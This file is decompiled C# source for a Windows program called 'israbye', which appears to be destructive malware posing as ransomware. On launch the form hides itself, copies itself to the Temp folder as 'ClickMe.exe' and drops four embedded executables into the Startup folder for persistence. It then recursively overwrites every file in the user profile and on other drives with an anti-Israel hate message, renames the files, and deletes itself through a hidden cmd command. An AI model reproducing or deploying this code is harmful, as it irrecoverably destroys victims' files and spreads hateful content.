using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using israbye.My;
using israbye.My.Resources;

namespace israbye;

[DesignerGenerated]
public class Form1 : Form
{
	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	private string dir;

	private string content;

	[DebuggerNonUserCode]
	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		__ENCAddToList(this);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void __ENCAddToList(object value)
	{
		checked
		{
			lock (__ENCList)
			{
				if (__ENCList.Count == __ENCList.Capacity)
				{
					int num = 0;
					int num2 = __ENCList.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = __ENCList[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								__ENCList[num] = __ENCList[num3];
							}
							num++;
						}
						num3++;
					}
					__ENCList.RemoveRange(num, __ENCList.Count - num);
					__ENCList.Capacity = __ENCList.Count;
				}
				__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(116, 42);
		((Form)this).set_ClientSize(clientSize);
		((Control)this).set_Name("Form1");
		((Form)this).set_Text("Form1");
		((Control)this).ResumeLayout(false);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Control)this).Hide();
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Opacity(0.0);
		content = "Fuck-israel, " + Environment.UserName + " You Will never Recover your Files Until Israel disepeare";
		dir = "C:\\Users\\" + Environment.UserName;
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		File.Copy(Application.get_ExecutablePath(), ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Temp() + "\\ClickMe.exe");
		File.WriteAllBytes(folderPath + "\\cry.exe", Resources.cry);
		File.WriteAllBytes(folderPath + "\\cur.exe", Resources.cur);
		File.WriteAllBytes(folderPath + "\\lock.exe", Resources.@lock);
		File.WriteAllBytes(folderPath + "\\index.exe", Resources.Israhell);
		cryptfolder(dir);
		DriveInfo[] drives = DriveInfo.GetDrives();
		checked
		{
			int num = drives.Length - 1;
			int num2 = 1;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 > num4)
				{
					break;
				}
				try
				{
					if (((ServerComputer)MyProject.Computer).get_FileSystem().DirectoryExists(drives[num2].ToString()))
					{
						cryptfolder(drives[num2].ToString());
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				num2++;
			}
			Process.Start(folderPath + "\\cry.exe");
			Process.Start(folderPath + "\\cur.exe");
			Process.Start(folderPath + "\\lock.exe");
			Process.Start(folderPath + "\\index.exe");
			Melt(1);
		}
	}

	private void cryptfolder(string path)
	{
		string[] files = Directory.GetFiles(path);
		string[] directories = Directory.GetDirectories(path);
		checked
		{
			int num = files.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 > num4)
				{
					break;
				}
				try
				{
					File.WriteAllText(files[num2], content);
					File.Move(files[num2], files[num2] + ".israbye");
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				int num5 = directories.Length - 1;
				int num6 = 0;
				while (true)
				{
					int num7 = num6;
					num4 = num5;
					if (num7 > num4)
					{
						break;
					}
					try
					{
						cryptfolder(directories[num6]);
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					num6++;
				}
				num2++;
			}
		}
	}

	private void Melt(int Timeout)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe");
		processStartInfo.Arguments = "/c ping 1.1.1.1 -n 1 -w " + Timeout + " > Nul & Del \"" + Application.get_ExecutablePath() + "\"";
		processStartInfo.CreateNoWindow = true;
		processStartInfo.ErrorDialog = false;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		Process.Start(processStartInfo);
		Application.ExitThread();
	}
}
